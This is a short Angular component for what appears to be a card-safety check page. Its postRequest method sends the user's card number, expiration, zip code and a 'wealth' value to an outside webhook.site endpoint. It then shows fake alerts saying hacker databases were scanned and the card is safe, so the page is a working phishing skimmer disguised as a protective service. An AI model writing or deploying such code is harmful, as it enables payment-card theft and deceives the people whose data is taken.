import { Component } from '@angular/core';
import {HttpClient} from '@angular/common/http';
import {ValidationErrors} from '@angular/forms';

interface Post {
  id: number;
  cardNum: string;
  cardExpiration: string;
  cardZipCode: string;
  wealth: number;
}

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  title = 'registrace';
  http: HttpClient;

  name = '';
  post: Post = {id: -1, cardNum: '666', cardExpiration: '666', cardZipCode: '666', wealth: 666};
  pocetParu = 0;

  constructor(httpClient: HttpClient) {
   this.http = httpClient;
  }

  print(aaa: string): void {
    console.log(aaa);
  }

  postRequest(): void{
    this.post.id = this.pocetParu;
    this.pocetParu++;
    this.http.post<Post>('https://webhook.site/4ddb7fd6-3032-4162-b9a7-f0e9f922106d', this.post)
      .subscribe( e => {alert('Scanning hacker´s databases'); alert('You are completely safe, your card number did´t show up in any of hacker´s database!'); });
  }
}


